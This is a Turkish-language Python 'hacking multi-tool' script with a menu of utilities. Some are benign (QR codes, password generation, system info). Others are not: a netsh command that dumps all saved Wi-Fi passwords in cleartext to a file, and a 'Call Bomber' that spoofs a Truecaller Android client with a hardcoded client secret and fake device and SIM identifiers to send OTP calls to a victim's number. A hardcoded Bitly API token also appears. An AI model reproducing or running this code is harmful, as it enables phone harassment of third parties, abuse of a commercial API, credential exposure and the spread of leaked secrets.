import qrcode
from colorama import Fore,Back,Style,init
import os 
import instaloader
import winshell
import random
import pyshorteners
import hashlib
import requests
import datetime
import tkinter as tk
import getpass
import socket
import shutil
import platform
import psutil
import time



init()

tool_isim = Fore.CYAN+"""

                               N E B U L O N
                               N E B U L O N
                               N E B U L O N

"""+Style.RESET_ALL

anamenu= Fore.YELLOW+"""
1 QRcode Oluşturucu           |             2 İnstegram Profil Foto İndirici
                              |
3 Çöp Kutusunu Boşalt         |             4 Şifre Oluşturucu
                              |
5 Url Kısaltıcı               |             6 Wifi Kayıtlı Şifreleri indirici
                              |
7 PC Bilgileri                |             8 Call Bomber
                              |
00 Exit                       |



"""+Style.RESET_ALL

os.system('cls' if os.name == 'nt' else 'clear')
print(tool_isim+anamenu)

data = int(input(Fore.GREEN+"==>"+Style.RESET_ALL))


if data == 1 :
    #QRcode bölümü
    name_qrcode = Fore.CYAN+"""
    
                               Q R C O D E
                               Q R C O D E
                               Q R C O D E


    """+Style.RESET_ALL
    os.system('cls' if os.name == 'nt' else 'clear')
    print(name_qrcode)

    qr_data = input(Fore.GREEN+"Qrcode Kaynak ==>"+Style.RESET_ALL)
    qr_file_data = input(Fore.GREEN+"Qrcode Dosya İsmi ==>"+Style.RESET_ALL)
    
    qrcode_x = qrcode.QRCode(box_size=17, border=8)
    qrcode_x.add_data(qr_data)
    qrcode_x.make(fit=True)

    new_qrcode_file=qrcode_x.make_image(fill_color="black", back_color='white')
    print(Fore.GREEN+"Qrcode Başarılı Bir Şekilde Oluşturuldu."+Style.RESET_ALL)
    new_qrcode_file.save(qr_file_data)
    os.startfile(f'{qr_file_data}')

elif data == 2 :
    #İG Foto indirici
    name_ig = Fore.CYAN+"""
                               İ N S T A G R A M
                               İ N S T A G R A M
                               İ N S T A G R A M 


    """+Style.RESET_ALL
    os.system('cls' if os.name == 'nt' else 'clear')
    print(name_ig)

    ig_profile = input(Fore.GREEN+"İnstegram Kullanıcı İsmi Giriniz ==>"+Style.RESET_ALL)
    ig = instaloader.Instaloader()
    ig_profle_pp = ig.download_profile(ig_profile, profile_pic_only=True)
    print(Fore.GREEN+f"İndirildi {ig_profile}")

elif data == 3 :
    #çöp bölümü
    name_rubbish = Fore.CYAN + """
                               Ç Ö P  K U T U S U
                               Ç Ö P  K U T U S U
                               Ç Ö P  K U T U S U


    """+Style.RESET_ALL
    os.system('cls' if os.name == 'nt' else 'clear')
    print(name_rubbish)

    try:
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=True)
        print(Fore.GREEN+"Çöp Kutusu Başarılı Bir Şekilde Boşaltıldı.")
    except Exception as e:
        print(Fore.RED+"Hata(çöp kutunuz boş ise hata cıkmasına neden ola bilir.):",str(e)+Style.RESET_ALL)

elif data == 4 :
    #şifre oluşturma bölümü
    harfler = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    numaralar = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    ozelKarakterler = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '+', '.']

    name_password = Fore.CYAN + """
                               Y E N İ  Ş İ F R E
                               Y E N İ  Ş İ F R E
                               Y E N İ  Ş İ F R E


    """+Style.RESET_ALL

    os.system('cls' if os.name == 'nt' else 'clear')
    print(name_password)

    def new_password():
        length_password = int(input(Fore.GREEN+"Şifre Uzunlugunu Giriniz ==>"+Style.RESET_ALL))
        how_many_password = int(input(Fore.GREEN+"Kaç Tane Şifre Oluşturulsun ==>"))
        password_number = 0

        for i in range(how_many_password):
            password = ''
            password_number += 1
            for i in range(length_password):
                password += random.choice(harfler + numaralar + ozelKarakterler)
            
            print(Fore.YELLOW + f"Şifre {password_number}: {password}" + Style.RESET_ALL)

    new_password()


elif data == 5 :
    #URL KISALTMA BÖLÜMÜ
    name_url=Fore.CYAN + """
                               U R L  K I S A L T I C I
                               U R L  K I S A L T I C I
                               U R L  K I S A L T I C I


    """
    os.system('cls' if os.name == 'nt' else 'clear')
    print(name_url)
    URL_TOKEN = '02ac7103731866efe15e9ded7c6b2fd244eac0be'

    url_shorten = input(Fore.GREEN + "Kısaltmak İstediginiz Url'yi Giriniz ==>"+Style.RESET_ALL)

    method=pyshorteners.Shortener(api_key=URL_TOKEN)
    shorten_url = method.bitly.short(url_shorten)
    print(Fore.YELLOW + f"Kısaltılmış Url: {shorten_url}")

elif data == 6 :
    #WİFİ ŞİFRELERİ BÖLÜMÜ
    name_wifi = Fore.CYAN + """
                               W İ F İ  Ş İ F R E
                               W İ F İ  Ş İ F R E
                               W İ F İ  Ş İ F R E


    """
    os.system('cls' if os.name == 'nt' else 'clear')
    print(name_wifi)

    now = datetime.datetime.now()
    wifi_history = now.strftime("%Y-%m-%d")

    command = """for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear"""
    file_location = os.getcwd()
    wifi_output = os.popen(command).read()
    file_seve_name = f"{file_location}/Wifi_Passwords({wifi_history}).txt"

    print(Fore.MAGENTA + wifi_output)

    with open(file_seve_name, "w") as file_seve:
        file_seve.write(wifi_output)
    print(Fore.YELLOW + f"Kayıtlı Wifi Şifreleri Kaydedildi {file_seve_name}")
        

elif data == 7 :
    pc_datas = Fore.CYAN + """
                               P C  B İ L G İ L E R İ
                               P C  B İ L G İ L E R İ
                               P C  B İ L G İ L E R İ


    """ + Style.RESET_ALL
    os.system('cls' if os.name == 'nt' else 'clear')
    print(pc_datas)
    print(Fore.GREEN + "PC Bilgileri Alınıyor..." + Style.RESET_ALL)
    time.sleep(4)
    print(Fore.GREEN + "PC bilgileri Alındı." + Style.RESET_ALL)
    time.sleep(1)


    def sistem_bilgileri():
        total, used, free = shutil.disk_usage("/")
        total_gb = total // (2**30)
        used_gb = used // (2**30)
        free_gb = free // (2**30)

        virtual_memory = psutil.virtual_memory()
    
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
    
        user = getpass.getuser()
    
        system_info = platform.uname()
    
        battery = psutil.sensors_battery()
        if battery:
            pil_yuzdesi = battery.percent
            sarj_cihazi = "Evet" if battery.power_plugged else "Hayır"
        else:
            pil_yuzdesi = "N/A"
            sarj_cihazi = "N/A"
    
        return {
            "User": user,
            "IP": ip,
            "Toplam disk alanı": f"{total_gb} GB",
            "Kullanılan disk alanı": f"{used_gb} GB",
            "Boş disk alanı": f"{free_gb} GB",
            "Sistem": system_info.system,
            "Makine": system_info.machine,
            "İşlemci": system_info.processor,
            "CPU Sayısı": psutil.cpu_count(logical=True),
            "CPU Frekansı": f"{psutil.cpu_freq().current:.2f} MHz",
            "Toplam Bellek": f"{virtual_memory.total / (1024 ** 3):.2f} GB",
            "Kullanılan Bellek": f"{virtual_memory.used / (1024 ** 3):.2f} GB",
            "Pil Yüzdesi": pil_yuzdesi,
            "Şarj Cihazı": sarj_cihazi
            }

    def ekrana_yaz():
        bilgileri = sistem_bilgileri()
        now = datetime.datetime.now().strftime("%H:%M")
    
        os.system('cls' if os.name == 'nt' else 'clear')
    
        print(f"Saat: {now}")
        for anahtar, deger in bilgileri.items():
            print(f"* {anahtar}: {deger}")
    ekrana_yaz()

elif data == 8 :
    name_call = Fore.CYAN + """
                               C A L L  B O M B E R
                               C A L L  B O M B E R
                               C A L L  B O M B E R


    """ + Style.RESET_ALL
    asa = '123456789'
    gigk = ''.join(random.choice(asa) for i in range(10))
    md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]

    clientsecret = 'lvc22mp3l1sfv6ujg83rd17btt'
    user_agent = 'Truecaller/12.34.8 (Android;8.1.2)'
    accept_encoding = 'gzip'
    content_length = '680'
    content_type = 'application/json; charset=UTF-8'
    Host = 'account-asia-south1.truecaller.com'
    headers = dict(zip(('clientsecret', 'user-agent', 'accept-encoding', 'content-length', 'content-type', 'Host'), 
                   (clientsecret, user_agent, accept_encoding, content_length, content_type, Host)))

    url = 'https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp'

    def send_spam(phone_number):
        data = ('{"countryCode":"eg","dialingCode":20,"installationDetails":{"app":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34,"store":"GOOGLE_PLAY"},"device":{"deviceId":"' + md5 + '","language":"ar",'
            '"manufacturer":"Xiaomi","mobileServices":["GMS"],"model":"Redmi Note 8A Prime","osName":"Android",'
            '"osVersion":"7.1.2","simSerials":["8920022021714943876f","8920022022805258505f"]},"language":"ar",'
            '"sims":[{"imsi":"602022207634386","mcc":"602","mnc":"2","operator":"vodafone"},{"imsi":"602023133590849",'
            '"mcc":"602","mnc":"2","operator":"vodafone"}],"storeVersion":{"buildVersion":8,"majorVersion":12,'
            '"minorVersion":34}},"phoneNumber":"' + phone_number + '","region":"region-2","sequenceNo":1}')
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            print('TAMAMLANDI.')
        else:
            print('Arama gönderilemedi.')

    print(name_call)
    phone_number = input(Fore.GREEN+"Numaranın başına +90 ekleyin ==>")
    send_spam(phone_number)


